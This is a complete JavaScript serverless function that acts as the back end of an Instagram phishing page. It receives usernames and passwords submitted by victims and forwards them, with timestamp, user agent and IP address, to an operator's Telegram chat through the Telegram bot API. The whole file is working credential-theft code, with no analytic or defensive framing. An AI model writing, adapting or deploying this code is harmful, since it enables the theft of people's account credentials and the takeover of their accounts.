// api/send-info.js
// This is a serverless function for Vercel/Netlify or Express.js endpoint

// Get configuration from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export default async function handler(req, res) {
    // Set CORS headers if needed
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight request
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ 
            success: false, 
            message: 'Method not allowed' 
        });
    }

    // Check if environment variables are set
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Missing environment variables');
        return res.status(500).json({ 
            success: false, 
            message: 'Server configuration error' 
        });
    }

    try {
        const { username, password, timestamp, userAgent } = req.body;

        // Validate input
        if (!username || !password) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username and password are required' 
            });
        }

        // Format message for Telegram
        const message = `
🔐 <b>New Instagram Login Attempt</b>

👤 <b>Username:</b> ${escapeHtml(username)}
🔑 <b>Password:</b> ${escapeHtml(password)}

📅 <b>Time:</b> ${new Date(timestamp).toLocaleString()}
🌐 <b>User Agent:</b> ${escapeHtml(userAgent)}
📍 <b>IP:</b> ${req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown'}
        `.trim();

        // Send to Telegram
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );

        const telegramData = await telegramResponse.json();

        if (telegramData.ok) {
            return res.status(200).json({ 
                success: true, 
                message: 'Information sent successfully' 
            });
        } else {
            console.error('Telegram API error:', telegramData);
            return res.status(500).json({ 
                success: false, 
                message: 'Failed to send information' 
            });
        }

    } catch (error) {
        console.error('Server error:', error);
        return res.status(500).json({ 
            success: false, 
            message: 'Internal server error' 
        });
    }
}

// Helper function to escape HTML characters
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}